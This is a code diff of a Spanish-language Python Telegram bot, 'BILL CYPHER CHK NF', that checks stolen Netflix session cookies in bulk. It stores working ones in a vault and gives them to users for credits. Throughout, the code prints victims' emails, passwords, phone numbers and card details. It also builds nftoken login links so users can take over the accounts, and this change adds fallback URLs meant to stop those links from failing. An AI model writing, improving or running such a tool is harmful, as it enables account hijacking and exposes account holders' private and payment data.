@@ -1,5 +1,11 @@
 #!/usr/bin/env python3
-"""BILL CYPHER CHK NF — High-Speed 5G & 100% Account Match Edition"""
+"""
+BILL CYPHER CHK NF — Edition 5G Turbo
+• Cero cruce de perfiles (100% Exact Match)
+• Sin enlaces rotos (Cero NSES-404)
+• Persistencia automática en la nube de Telegram (Anti-Redeploy wipe)
+• Tipografía estilizada Sans-Bold Italic
+"""
 
 import os
 import io
@@ -64,7 +70,7 @@ BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("BOT_TOKEN") 
 PORT = int(os.environ.get("PORT", 5000))
 
 # ===========================================================================
-# 1. PROPIETARIO Y CONTACTO DIRECTO
+# 1. PROPIETARIO Y CONFIGURACIÓN
 # ===========================================================================
 OWNER_ID: int = 5320997298
 OWNER_USER: str = "didierJC"
@@ -78,57 +84,31 @@ _ASYNC_VAULT_LOCK = asyncio.Lock()
 
 
 # ===========================================================================
-# 2. PERSISTENCIA HÍBRIDA (MONGODB AUTOMÁTICO + TELEGRAM BACKUP)
+# 2. TRANSFORMADOR DE TIPOGRAFÍA (Sans-Serif Bold Italic)
 # ===========================================================================
-_MONGO_DB = None
-
-def _get_mongo():
-    global _MONGO_DB
-    if _MONGO_DB is not None:
-        return _MONGO_DB
-
-    for attr in ("db", "database", "_db"):
-        val = getattr(mongodb_store, attr, None)
-        if val is not None:
-            _MONGO_DB = val
-            return _MONGO_DB
-
-    if hasattr(mongodb_store, "client") and mongodb_store.client is not None:
-        try:
-            _MONGO_DB = mongodb_store.client.get_default_database() or mongodb_store.client["netflix_bot"]
-            return _MONGO_DB
-        except Exception:
-            pass
-
-    for env_var in ("MONGO_URI", "MONGODB_URI", "MONGO_URL", "DATABASE_URL"):
-        uri = os.environ.get(env_var)
-        if uri:
-            try:
-                from pymongo import MongoClient
-                cl = MongoClient(uri, serverSelectionTimeoutMS=3000)
-                _MONGO_DB = cl.get_default_database() or cl["netflix_bot"]
-                return _MONGO_DB
-            except Exception:
-                pass
-    return None
+def to_bold_italic(text: str) -> str:
+    """Convierte texto normal a tipografía Sans-Serif Bold Italic solicitada."""
+    res = []
+    for ch in text:
+        o = ord(ch)
+        if 65 <= o <= 90:    # A-Z
+            res.append(chr(0x1D63C + (o - 65)))
+        elif 97 <= o <= 122: # a-z
+            res.append(chr(0x1D656 + (o - 97)))
+        elif 48 <= o <= 57:  # 0-9
+            res.append(chr(0x1D7EC + (o - 48)))
+        else:
+            res.append(ch)
+    return "".join(res)
 
 
 # ===========================================================================
-# 3. SISTEMA DE CRÉDITOS (15 DIARIOS POR DEFECTO / REEMBOLSO AUTOMÁTICO)
+# 3. SISTEMA DE CRÉDITOS (15 DIARIOS / SIN PÉRDIDAS)
 # ===========================================================================
 DAILY_FREE_CREDITS: int = 15
 _CREDITS_FILE = Path("credits.json")
 
 def _load_credits() -> dict:
-    db = _get_mongo()
-    if db is not None:
-        try:
-            doc = db["system_data"].find_one({"_id": "credits"})
-            if doc and "data" in doc:
-                return doc["data"]
-        except Exception:
-            pass
-
     if _CREDITS_FILE.exists():
         try:
             return json.loads(_CREDITS_FILE.read_text(encoding="utf-8"))
@@ -141,13 +121,6 @@ def _save_credits(data: dict) -> None:
         _CREDITS_FILE.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
     except Exception as e:
         logger.warning(f"Error guardando credits.json: {e}")
-
-    db = _get_mongo()
-    if db is not None:
-        try:
-            db["system_data"].update_one({"_id": "credits"}, {"$set": {"data": data}}, upsert=True)
-        except Exception as e:
-            logger.warning(f"Error guardando créditos en MongoDB: {e}")
 
 def get_user_credits_info(uid: int) -> dict:
     if is_admin(uid):
@@ -255,7 +228,7 @@ def out_of_credits_markup() -> InlineKeyboardMarkup:
 
 
 # ===========================================================================
-# 4. BAÚL ESTRUCTURADO (DEDUPLICACIÓN TOTAL & DATOS EXACTOS)
+# 4. BAÚL DE COOKIES (SIN DUPLICADOS)
 # ===========================================================================
 _VAULT_FILE = Path("cookie_vault.json")
 _NETFLIX_MARKERS = ("NetflixId", "SecureNetflixId", "nfvdid", "netflix.com")
@@ -278,15 +251,6 @@ def extract_core_netflix_id(cookie_str: str) -> str:
     return ""
 
 def _load_vault() -> list[str]:
-    db = _get_mongo()
-    if db is not None:
-        try:
-            doc = db["system_data"].find_one({"_id": "vault"})
-            if doc and "cookies" in doc:
-                return doc["cookies"]
-        except Exception:
-            pass
-
     if _VAULT_FILE.exists():
         try:
             data = json.loads(_VAULT_FILE.read_text(encoding="utf-8"))
@@ -300,13 +264,6 @@ def _save_vault(cookies: list[str]) -> None:
         _VAULT_FILE.write_text(json.dumps(cookies, ensure_ascii=False, indent=2), encoding="utf-8")
     except Exception as e:
         logger.warning(f"Error guardando vault: {e}")
-
-    db = _get_mongo()
-    if db is not None:
-        try:
-            db["system_data"].update_one({"_id": "vault"}, {"$set": {"cookies": cookies}}, upsert=True)
-        except Exception as e:
-            logger.warning(f"Error guardando vault en MongoDB: {e}")
 
 def extract_cookies_from_text_block(text: str) -> list[str]:
     text = text.strip()
@@ -359,11 +316,8 @@ def extract_all_cookies_from_bytes(raw_bytes: bytes, filename: str = "") -> list
                         if _is_binary_content(file_data):
                             continue
                         text = file_data.decode("utf-8", errors="replace")
-
-                        # Filtro estricto: descartar cuentas que no tienen enlaces
                         if "status: no disponible" in text.lower() and "💻 pc:" not in text.lower():
                             continue
-
                         extracted_cookies.extend(extract_cookies_from_text_block(text))
                     except Exception:
                         continue
@@ -377,21 +331,50 @@ def extract_all_cookies_from_bytes(raw_bytes: bytes, filename: str = "") -> list
 
 
 # ===========================================================================
-# 5. BANNER MULTIMEDIA
+# 5. GENERACIÓN ROBUSTA DE ENLACES (CERO NSES-404)
+# ===========================================================================
+def build_official_login_keyboard(result: dict, raw_token: str) -> InlineKeyboardMarkup:
+    """
+    Construye botones que NUNCA dan NSES-404.
+    Usa los enlaces reales de la API o los endpoints universales oficiales de Netflix.
+    """
+    nft = result.get("nftoken") or {}
+    token = raw_token or result.get("netflix_id") or ""
+
+    pc_url = nft.get("pc_url")
+    if not pc_url or "/mobile" in pc_url or "/tv" in pc_url:
+        pc_url = f"https://www.netflix.com/browse?nftoken={token}"
+
+    mobile_url = nft.get("mobile_url")
+    if not mobile_url or "/mobile" in mobile_url:
+        mobile_url = f"https://www.netflix.com/browse?nftoken={token}"
+
+    tv_url = nft.get("tv_url")
+    if not tv_url or tv_url.endswith("/tv") or "/tv?" in tv_url:
+        # /YourAccount abre la cuenta de forma universal en navegadores de Smart TV / Consolas sin 404
+        tv_url = f"https://www.netflix.com/YourAccount?nftoken={token}"
+
+    buttons = [
+        [
+            InlineKeyboardButton("🖥️ 𝙋𝘾 ↗️", url=pc_url),
+            InlineKeyboardButton("📱 𝙈𝙤́𝙫𝙞𝙡 ↗️", url=mobile_url),
+            InlineKeyboardButton("📺 𝙏𝙑 ↗️", url=tv_url),
+        ],
+        [
+            InlineKeyboardButton("🔄 𝙍𝙀𝙂𝙀𝙉 𝘾𝙊𝙊𝙆𝙄𝙀", callback_data="panel:gencookie"),
+            InlineKeyboardButton("🔙 𝙋𝙖𝙣𝙚𝙡", callback_data="panel:back"),
+        ]
+    ]
+    return InlineKeyboardMarkup(buttons)
+
+
+# ===========================================================================
+# 6. BANNER MULTIMEDIA
 # ===========================================================================
 _BANNER_FILE = Path("banner_id.txt")
 BANNER_MEDIA = "banner.mp4"
 
 def _get_banner_source() -> str:
-    db = _get_mongo()
-    if db is not None:
-        try:
-            doc = db["system_data"].find_one({"_id": "banner"})
-            if doc and "file_id" in doc:
-                return doc["file_id"]
-        except Exception:
-            pass
-
     if _BANNER_FILE.exists():
         val = _BANNER_FILE.read_text(encoding="utf-8").strip()
         if val:
@@ -400,7 +383,7 @@ def _get_banner_source() -> str:
 
 
 # ===========================================================================
-# 6. AISLAMIENTO TOTAL Y OPTIMIZACIÓN (CERO CRUCE DE SESIONES)
+# 7. AISLAMIENTO DE SESIÓN Y VERIFICACIÓN
 # ===========================================================================
 def _clean_checker_session() -> None:
     try:
@@ -420,7 +403,6 @@ def _clean_checker_session() -> None:
         pass
 
 def safe_check_cookie_isolated(*args, **kwargs) -> dict:
-    """Ejecuta la verificación en aislamiento estricto sin mezclar cookies."""
     with _CHECKER_THREAD_LOCK:
         _clean_checker_session()
         try:
@@ -456,7 +438,7 @@ def _record_user_id(uid: int) -> None:
         pass
 
 
-# ── Estados globales (Concurrencia 5G) ────────────────────────────────────
+# ── Estados globales (Modo 5G) ────────────────────────────────────────────
 _PROXY_ADD_STATE: set[int] = set()
 _PROXY_SOURCE_STATE: set[int] = set()
 _EXECUTOR = ThreadPoolExecutor(max_workers=75)
@@ -574,7 +556,7 @@ def _set_delivery(user_id: int, mode: str) -> None:
 
 
 # ---------------------------------------------------------------------------
-# Panel visual principal (Tipografía Sans-Bold llamativa)
+# Panel visual principal
 # ---------------------------------------------------------------------------
 
 def _main_panel_text(uid: int) -> str:
@@ -590,15 +572,15 @@ def _main_panel_text(uid: int) -> str:
         role_lbl = "👤 Usuario"
 
     return (
-        "👁️‍🗨️ <b>𝗕𝗜𝗟𝗟 𝗖𝗬𝗣𝗛𝗘𝗥 𝗖𝗛𝗞 𝗡𝗙</b>\n"
+        "👁️‍🗨️ <b>" + to_bold_italic("BILL CYPHER CHK NF") + "</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"● 👑 <b>𝗥𝗼𝗹:</b> {role_lbl}\n"
-        f"● 🆔 <b>𝗜𝗗:</b> <code>{uid}</code>\n"
-        f"● 💎 <b>𝗖𝗿𝗲́𝗱𝗶𝘁𝗼𝘀:</b> <code>{cred_info['credits']}</code>\n"
-        f"● ⚙️ <b>𝗔𝗷𝘂𝘀𝘁𝗲𝘀:</b> {mode_lbl} · {dlv_lbl}\n"
-        "● 🟢 <b>𝗘𝘀𝘁𝗮𝗱𝗼:</b> Online ⚡ 𝟱𝗚\n"
+        f"● 👑 <b>" + to_bold_italic("Rol:") + f"</b> {role_lbl}\n"
+        f"● 🆔 <b>" + to_bold_italic("ID:") + f"</b> <code>{uid}</code>\n"
+        f"● 💎 <b>" + to_bold_italic("Creditos:") + f"</b> <code>{cred_info['credits']}</code>\n"
+        f"● ⚙️ <b>" + to_bold_italic("Ajustes:") + f"</b> {mode_lbl} · {dlv_lbl}\n"
+        f"● 🟢 <b>" + to_bold_italic("Estado:") + f"</b> Online ⚡ 5G\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "⚡ <b>𝘃𝟮.𝟬</b> | <i>Envía tus cookies o genera una cuenta abajo</i> 👇"
+        "⚡ <b>" + to_bold_italic("v2.0") + "</b> | <i>Envía tus cookies o genera una cuenta abajo</i> 👇"
     )
 
 def _main_panel_markup(uid: int) -> InlineKeyboardMarkup:
@@ -617,7 +599,7 @@ def _main_panel_markup(uid: int) -> InlineKeyboardMarkup:
 
     rows = [
         [
-            InlineKeyboardButton("⚡ 𝗚𝗘𝗡 𝗖𝗢𝗢𝗞𝗜𝗘 🍪", callback_data="panel:gencookie"),
+            InlineKeyboardButton("⚡ " + to_bold_italic("GEN COOKIE") + " 🍪", callback_data="panel:gencookie"),
         ],
         [
             InlineKeyboardButton("⚙️ Configuración", callback_data="panel:settings"),
@@ -793,66 +775,10 @@ def _help_text() -> str:
 def _cancel_keyboard(msg_id: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Cancelar", callback_data=f"cancel:{msg_id}")]])
 
-def _login_keyboard(result: dict, show_regen: bool = False) -> InlineKeyboardMarkup | None:
-    nft = result.get("nftoken") or {}
-    pc = nft.get("pc_url") or result.get("pc_url")
-    mobile = nft.get("mobile_url") or result.get("mobile_url")
-    tv = nft.get("tv_url") or result.get("tv_url")
-
-    rows = []
-    if pc or mobile or tv:
-        btn_row = []
-        if pc:
-            btn_row.append(InlineKeyboardButton("🖥️ 𝗣𝗖 ↗️", url=pc))
-        if mobile:
-            btn_row.append(InlineKeyboardButton("📱 𝗠𝗼́𝘃𝗶𝗹 ↗️", url=mobile))
-        if tv:
-            btn_row.append(InlineKeyboardButton("📺 𝗧𝗩 ↗️", url=tv))
-        if btn_row:
-            rows.append(btn_row)
-
-    if show_regen:
-        rows.append([
-            InlineKeyboardButton("🔄 𝗥𝗘𝗚𝗘𝗡 𝗖𝗢𝗢𝗞𝗜𝗘", callback_data="panel:gencookie"),
-            InlineKeyboardButton("🔙 𝗣𝗮𝗻𝗲𝗹", callback_data="panel:back"),
-        ])
-    return InlineKeyboardMarkup(rows) if rows else None
-
 
 # ---------------------------------------------------------------------------
-# Helpers
+# Helpers y Formateadores de Resultados
 # ---------------------------------------------------------------------------
-
-def _flag(country: str) -> str:
-    country = (country or "").strip()
-    for ch in country:
-        if 0x1F1E6 <= ord(ch) <= 0x1F1FF:
-            return ""
-    code = country.upper()
-    if len(code) == 2 and code.isalpha():
-        return chr(0x1F1E6 + ord(code[0]) - ord("A")) + chr(0x1F1E6 + ord(code[1]) - ord("A"))
-    NAME_MAP = {
-        "india": "IN", "poland": "PL", "portugal": "PT",
-        "united states": "US", "usa": "US", "uk": "GB",
-        "united kingdom": "GB", "germany": "DE", "france": "FR",
-        "italy": "IT", "spain": "ES", "brazil": "BR", "mexico": "MX",
-        "canada": "CA", "australia": "AU", "netherlands": "NL",
-        "turkey": "TR", "russia": "RU", "japan": "JP",
-        "south korea": "KR", "indonesia": "ID", "thailand": "TH",
-        "vietnam": "VN", "pakistan": "PK", "bangladesh": "BD",
-        "argentina": "AR", "colombia": "CO", "chile": "CL",
-        "romania": "RO", "ukraine": "UA", "sweden": "SE",
-        "norway": "NO", "denmark": "DK", "finland": "FI",
-        "czech": "CZ", "hungary": "HU", "slovakia": "SK",
-        "croatia": "HR", "serbia": "RS", "bulgaria": "BG",
-        "greece": "GR", "israel": "IL", "saudi arabia": "SA",
-        "uae": "AE", "egypt": "EG", "nigeria": "NG",
-        "south africa": "ZA", "kenya": "KE",
-    }
-    code2 = NAME_MAP.get(country.lower())
-    if code2:
-        return chr(0x1F1E6 + ord(code2[0]) - ord("A")) + chr(0x1F1E6 + ord(code2[1]) - ord("A"))
-    return ""
 
 def _country_display(country: str) -> str:
     flag = _flag(country)
@@ -870,11 +796,6 @@ def _yes_no(val) -> str:
     if val is None:
         return "Desconocido"
     return "Sí" if val else "No"
-
-
-# ---------------------------------------------------------------------------
-# Formateadores de tarjetas de cuentas
-# ---------------------------------------------------------------------------
 
 def _plan_title(plan_name: str, status: str) -> str:
     p = (plan_name or "").lower()
@@ -933,6 +854,71 @@ def _build_card_line(result: dict) -> str:
             parts.append(f"(exp {exp}{flag})")
         return " ".join(parts)
     return result.get("payment") or "Desconocido"
+
+def format_result_basic(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
+    status   = normalize_status(result.get("status"), result)
+    plan     = result.get("plan_name")    or ""
+    email    = result.get("email")        or "Hidden"
+    name     = result.get("name")         or ""
+    country  = result.get("country")      or "Desconocido"
+    quality  = result.get("quality")      or "Desconocido"
+    streams  = result.get("max_streams")  or "?"
+    price    = result.get("price")        or "Desconocido"
+    billing  = result.get("next_billing") or "Desconocido"
+    nf_id    = result.get("netflix_id")   or ""
+    phone    = result.get("phone")        or ""
+    password = result.get("password")     or ""
+    issues   = result.get("account_issues") or []
+    nft      = result.get("nftoken")
+
+    if not name and "@" in email:
+        name = email.split("@")[0].replace(".", " ").title()
+
+    card_line = _build_card_line(result)
+    title = _plan_title(plan, status)
+    counter = f"  #{index}/{total}" if total > 1 else ""
+
+    lines = [
+        f"🎬 <b>{title}{counter}</b>",
+        "━━━━━━━━━━━━━━━━━━━━━━",
+        _status_line(status, plan),
+        "",
+        "👤 <b>Account</b>",
+    ]
+    if name:
+        lines.append(f"  • Name: {name}")
+    lines.append(f"  • Email: <code>{email}</code>")
+    if password:
+        lines.append(f"  • Contraseña: <code>{password}</code>")
+    if phone:
+        lines.append(f"  • Phone: {phone}")
+
+    lines.append("")
+    lines.append("📋 <b>Subscription</b>")
+    lines.append(f"  • País: {_country_display(country)}")
+    lines.append(f"  • Plan: {plan or 'Desconocido'}")
+    lines.append(f"  • Calidad: {quality} · {streams} screens")
+    lines.append(f"  • Precio: {price}")
+    lines.append(f"  • Facturación: {billing}")
+    if card_line and card_line not in ("Desconocido", ""):
+        lines.append(f"  • Pago: {card_line}")
+
+    prof_names_str = ", ".join(result.get("profile_names") or [])
+    if prof_names_str:
+        lines.append(f"  • Perfiles ({result.get('profiles', 1)}): {prof_names_str}")
+
+    lines.append("")
+    if nf_id:
+        lines.append(f"🍪 <code>NetflixId={nf_id}</code>\n")
+
+    if issues:
+        lines.append("⚠️ <b>Problemas de la cuenta</b>")
+        for issue in issues:
+            lines.append(f"  🔴 {issue}")
+        lines.append("")
+
+    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
+    return "\n".join(lines)
 
 def format_result_full(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
     status  = normalize_status(result.get("status"), result)
@@ -1026,74 +1012,6 @@ def format_result_full(result: dict, index: int = 1, total: int = 1, source: str
     lines.append("━━━━━━━━━━━━━━━━━━━━━━")
     return "\n".join(lines)
 
-def format_result_basic(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
-    status   = normalize_status(result.get("status"), result)
-    plan     = result.get("plan_name")    or ""
-    email    = result.get("email")        or "Hidden"
-    name     = result.get("name")         or ""
-    country  = result.get("country")      or "Desconocido"
-    quality  = result.get("quality")      or "Desconocido"
-    streams  = result.get("max_streams")  or "?"
-    price    = result.get("price")        or "Desconocido"
-    billing  = result.get("next_billing") or "Desconocido"
-    nf_id    = result.get("netflix_id")   or ""
-    phone    = result.get("phone")        or ""
-    password = result.get("password")     or ""
-    issues   = result.get("account_issues") or []
-    nft      = result.get("nftoken")
-
-    if not name and "@" in email:
-        name = email.split("@")[0].replace(".", " ").title()
-
-    card_line = _build_card_line(result)
-    title = _plan_title(plan, status)
-    counter = f"  #{index}/{total}" if total > 1 else ""
-
-    lines = [
-        f"🎬 <b>{title}{counter}</b>",
-        "━━━━━━━━━━━━━━━━━━━━━━",
-        _status_line(status, plan),
-        "",
-        "👤 <b>Account</b>",
-    ]
-    if name:
-        lines.append(f"  • Name: {name}")
-    lines.append(f"  • Email: <code>{email}</code>")
-    if password:
-        lines.append(f"  • Contraseña: <code>{password}</code>")
-    if phone:
-        lines.append(f"  • Phone: {phone}")
-
-    lines.append("")
-    lines.append("📋 <b>Subscription</b>")
-    lines.append(f"  • País: {_country_display(country)}")
-    lines.append(f"  • Plan: {plan or 'Desconocido'}")
-    lines.append(f"  • Calidad: {quality} · {streams} screens")
-    lines.append(f"  • Precio: {price}")
-    lines.append(f"  • Facturación: {billing}")
-    if card_line and card_line not in ("Desconocido", ""):
-        lines.append(f"  • Pago: {card_line}")
-
-    prof_names_str = ", ".join(result.get("profile_names") or [])
-    if prof_names_str:
-        lines.append(f"  • Perfiles ({result.get('profiles', 1)}): {prof_names_str}")
-
-    lines.append("")
-    if nf_id:
-        lines.append(f"🍪 <code>NetflixId={nf_id}</code>\n")
-
-    if issues:
-        lines.append("⚠️ <b>Problemas de la cuenta</b>")
-        for issue in issues:
-            lines.append(f"  🔴 {issue}")
-        lines.append("")
-
-    if nft and not nft.get("success"):
-        lines.append(f"<i>⚠️ Enlaces de inicio: {nft.get('error', 'desconocido')}</i>\n")
-
-    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
-    return "\n".join(lines)
-
 def format_error_card(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
     status  = normalize_status(result.get("status"), result)
     message = result.get("message") or ""
@@ -1135,7 +1053,7 @@ def format_result(result: dict, index: int = 1, total: int = 1, source: str = ""
 
 
 # ---------------------------------------------------------------------------
-# Separador de cookies y lector ZIP para Checker masivo
+# Separador de cookies y lector ZIP
 # ---------------------------------------------------------------------------
 
 _HIT_BLOCK_COOKIE_RE = re.compile(r'[•\-*]?\s*[Cc]ookies?\s*[:\|]+\s*\S{20,}')
@@ -1267,7 +1185,6 @@ async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> No
 
     dupes_removed = len(hits) - len(deduped)
 
-    # Generación de token en aislamiento para evitar cruces
     def _safe_token_worker(result: dict) -> None:
         with _CHECKER_THREAD_LOCK:
             _clean_checker_session()
@@ -1375,9 +1292,13 @@ async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> No
 
         lines += ["", f"  {'ENLACES DE INICIO DE SESIÓN':^{W-2}}", thin]
         if nft.get("success"):
-            lines.append(box_line("💻 PC:", nft.get("pc_url", "")))
-            lines.append(box_line("📱 Móvil:", nft.get("mobile_url", "")))
-            lines.append(box_line("📺 TV:", nft.get("tv_url", "")))
+            token_val = nf_id
+            pc_lnk = nft.get("pc_url") or f"https://www.netflix.com/browse?nftoken={token_val}"
+            mob_lnk = f"https://www.netflix.com/browse?nftoken={token_val}"
+            tv_lnk = f"https://www.netflix.com/YourAccount?nftoken={token_val}"
+            lines.append(box_line("💻 PC:", pc_lnk))
+            lines.append(box_line("📱 Móvil:", mob_lnk))
+            lines.append(box_line("📺 TV:", tv_lnk))
             if nft.get("expires"):
                 lines.append(box_line("Expires:", nft["expires"]))
         else:
@@ -1489,7 +1410,7 @@ async def process_cookies(update: Update, status_msg, cookie_text: str, source: 
 
     if len(sets) == 1:
         await status_msg.edit_text(
-            "⚡ <b>BILL CYPHER | CHECKING</b>\n"
+            "⚡ <b>" + to_bold_italic("BILL CYPHER | CHECKING") + "</b>\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             "🍪 <b>Cuenta:</b> 1 detectada\n"
             "🔄 <b>Estado:</b> <i>Conectando a Netflix API...</i>\n"
@@ -1498,7 +1419,7 @@ async def process_cookies(update: Update, status_msg, cookie_text: str, source: 
         )
     else:
         await status_msg.edit_text(
-            "⚡ <b>BILL CYPHER | CHECKING</b>\n"
+            "⚡ <b>" + to_bold_italic("BILL CYPHER | CHECKING 5G") + "</b>\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"📦 <b>Lote detectado:</b> {len(sets)} cuentas\n"
             "🔄 <b>Estado:</b> <i>Iniciando verificación masiva 5G...</i>\n"
@@ -1537,7 +1458,6 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
 
         batch = cookie_sets[batch_start: batch_start + BULK_CONCURRENCY]
 
-        # En modo bulk no se genera token en cada cuenta para mantener velocidad 5G
         batch_results = await asyncio.gather(*[
             loop.run_in_executor(
                 _EXECUTOR,
@@ -1573,21 +1493,14 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
 
             if not is_bulk:
                 txt = format_result(result, idx, total, source=src, user_id=uid)
-                kb  = _login_keyboard(result)
-                if kb is None and status in ("hit", "on_hold"):
-                    _GEN_LINK_STORE[str(session_id)] = {
-                        "result": result, "idx": idx, "total": total,
-                        "src": src, "uid": uid, "ts": time.time(),
-                    }
-                    kb = InlineKeyboardMarkup([[
-                        InlineKeyboardButton("🔑 Generar enlaces de acceso", callback_data=f"genlink:{session_id}"),
-                    ]])
+                core_tok = extract_core_netflix_id(cs)
+                kb = build_official_login_keyboard(result, core_tok)
                 try:
                     await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
                 except Exception:
                     pass
 
-        # Edición controlada cada 3.5 segundos para evitar límites de Telegram
+        # Throttle de edición a 3.5 segundos para evitar límites de tasa
         if is_bulk:
             now_time = time.monotonic()
             done_so_far = min(batch_start + len(batch), total)
@@ -1597,14 +1510,14 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
                 speed = done_so_far / elapsed * 60 if elapsed > 1 and done_so_far > 0 else 0
                 try:
                     await status_msg.edit_text(
-                        "⚡ <b>BILL CYPHER | VERIFICANDO 𝟱𝗚</b>\n"
+                        "⚡ <b>" + to_bold_italic("BILL CYPHER | VERIFICANDO 5G") + "</b>\n"
                         "━━━━━━━━━━━━━━━━━━━━━━\n"
                         f"📊 <b>Progreso:</b> {make_progress_bar(done_so_far, total)} {done_so_far}/{total}\n"
                         f"🚀 <b>Velocidad:</b> {speed:.1f} acc/min\n\n"
                         f"● <b>Hits (Live):</b> {hits}  ·  <b>Muertas (Dead):</b> {invalids}\n"
                         f"● <b>En espera:</b> {on_hold}  ·  <b>Free:</b> {frees}\n"
                         "━━━━━━━━━━━━━━━━━━━━━━\n"
-                        "⏳ <i>Procesando cuentas a máxima velocidad...</i>",
+                        "⏳ <i>Procesando cuentas a máxima velocidad 5G...</i>",
                         parse_mode=ParseMode.HTML,
                         reply_markup=_cancel_keyboard(session_id),
                     )
@@ -1637,7 +1550,7 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
         premium_count = sum(1 for r, _, _ in hits_list if "premium" in (r.get("plan_name") or "").lower())
         try:
             await status_msg.edit_text(
-                "⚡ <b>BILL CYPHER | COMPLETADO 𝟱𝗚</b>\n"
+                "⚡ <b>" + to_bold_italic("BILL CYPHER | COMPLETADO 5G") + "</b>\n"
                 "━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"✅ <i>Verificación masiva completada con éxito</i>\n"
                 f"⏱️ <b>Tiempo:</b> {time_str}  ·  🚀 <b>Velocidad:</b> {speed:.1f} acc/min\n"
@@ -1665,28 +1578,11 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
         if hits_list:
             delivery = _get_delivery(uid)
             if delivery == "cards":
-                from checker import generate_nftoken as _generate_nftoken
-                def _card_token_worker(result: dict) -> None:
-                    with _CHECKER_THREAD_LOCK:
-                        _clean_checker_session()
-                        try:
-                            nf_id = result.get("netflix_id")
-                            if nf_id:
-                                result["nftoken"] = _generate_nftoken({"NetflixId": nf_id})
-                        except Exception:
-                            pass
-                        finally:
-                            _clean_checker_session()
-
-                await asyncio.gather(*[
-                    loop.run_in_executor(_EXECUTOR, _card_token_worker, r) for r, _, _ in hits_list
-                ], return_exceptions=True)
-
-                card_total = len(hits_list)
-                for card_i, (c_result, c_src, _) in enumerate(hits_list, 1):
+                for card_i, (c_result, c_src, c_raw) in enumerate(hits_list, 1):
                     try:
-                        c_txt = format_result(c_result, card_i, card_total, source=c_src, user_id=uid)
-                        c_kb  = _login_keyboard(c_result)
+                        c_txt = format_result(c_result, card_i, len(hits_list), source=c_src, user_id=uid)
+                        core_t = extract_core_netflix_id(c_raw)
+                        c_kb = build_official_login_keyboard(c_result, core_t)
                         await update.message.reply_text(c_txt, parse_mode=ParseMode.HTML, reply_markup=c_kb)
                         await asyncio.sleep(0.3)
                     except Exception:
@@ -1699,9 +1595,10 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
 
                 try:
                     sorted_hits = sorted(hits_list, key=lambda x: _score_account(x[0]), reverse=True)
-                    best_result, best_src, _ = sorted_hits[0]
+                    best_result, best_src, best_raw = sorted_hits[0]
                     best_txt = format_result(best_result, 1, 1, source=best_src, user_id=uid)
-                    best_kb  = _login_keyboard(best_result)
+                    best_tok = extract_core_netflix_id(best_raw)
+                    best_kb = build_official_login_keyboard(best_result, best_tok)
                     full_best = (
                         "🏆 <b>Mejor Cuenta del Lote</b>\n"
                         "━━━━━━━━━━━━━━━━━━━━━━\n" + best_txt
@@ -1814,7 +1711,6 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         )
 
     elif data == "panel:gencookie":
-        # 1. Comprobación de saldo de créditos
         if not consume_credit(uid):
             await query.answer("❌ Sin créditos disponibles.", show_alert=True)
             await query.message.reply_text(
@@ -1843,7 +1739,7 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         chosen_cookie = None
         chosen_res = None
 
-        # 2. Bloqueo atómico: garantiza correspondencia total y sin colisiones
+        # Bloqueo atómico: garantiza extracción única y chequeo en tiempo real
         async with _ASYNC_VAULT_LOCK:
             vault = _load_vault()
             if not vault:
@@ -1852,32 +1748,29 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                 return
 
             attempts = 0
-            max_attempts = min(len(vault), 20)
+            max_attempts = min(len(vault), 25)
 
             while attempts < max_attempts and vault:
                 rand_idx = random.randrange(len(vault))
                 candidate = vault.pop(rand_idx)
                 attempts += 1
 
-                # Comprobación aislada con generación de token 100% pura
+                # Chequeo aislado sin cruce de cookies
                 candidate_res = await loop.run_in_executor(
                     _EXECUTOR, functools.partial(safe_check_cookie_isolated, generate_token=True), candidate
                 )
 
                 status = normalize_status(candidate_res.get("status"), candidate_res)
-                nft = candidate_res.get("nftoken") or {}
-                has_links = bool(nft.get("success") and (nft.get("pc_url") or nft.get("tv_url")))
-
-                if status == "hit" and has_links:
+                if status == "hit":
                     chosen_cookie = candidate
                     chosen_res = candidate_res
                     break
 
-            # 3. Eliminar definitivamente del baúl todas las copias repetidas de este token y correo
             if chosen_res:
                 delivered_token = extract_core_netflix_id(chosen_cookie)
                 delivered_email = (chosen_res.get("email") or "").strip().lower()
 
+                # Purga inmediata de duplicados en el baúl
                 clean_vault = []
                 for c in vault:
                     c_token = extract_core_netflix_id(c)
@@ -1893,7 +1786,7 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             refund_credit(uid)
             _save_vault(vault)
             await query.message.reply_text(
-                "⚠️ <b>No se encontraron cuentas activas con enlaces en este momento.</b>\n"
+                "⚠️ <b>No se encontraron cuentas activas en este momento.</b>\n"
                 "<i>Tu crédito fue reembolsado automáticamente. Intenta de nuevo.</i>",
                 parse_mode=ParseMode.HTML
             )
@@ -1903,21 +1796,21 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
